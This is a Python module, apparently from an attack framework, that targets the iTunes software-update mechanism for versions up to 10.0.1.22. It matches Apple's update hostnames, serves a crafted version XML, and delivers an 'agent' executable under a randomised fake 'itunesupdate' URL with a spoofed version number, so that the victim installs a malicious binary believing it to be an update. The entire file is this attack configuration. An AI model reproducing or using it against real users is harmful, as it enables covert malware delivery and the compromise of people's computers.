from modules import ModuleBase


class iTunes(ModuleBase):
    name = 'itunes'
    version = '1.0'
    appver = '<= Itunes 10.0.1.22'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com>']
    description = ''
    vh = '(ax.itunes.apple.com|AkamaiGHost|itunes.apple.com)' 
    requests = [
        {   'path': '/version',
            'type': 'file',
            'method': '',
            'bin': '',
            'string' : "",
            'parse': '1',
            'file': './include/itunes/itunes_version.xml'
        },
        {   'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': '0',
            'file': ''
        }
    ]
    options = {
        'DATA1': {
            'val': "'http://itunes.com/' + rand_alpha(rand_num(1)) + '/itunesupdate' + rand_num(5) + '.exe'",
            'hidden': 1,
            'dynamic': 1,
        },
        'DATA2': {
            'val': "10.' + rand_num(1) + '.' + rand_num(1)",
            'hidden': 1,
            'dynamic': 1,
        }
    }
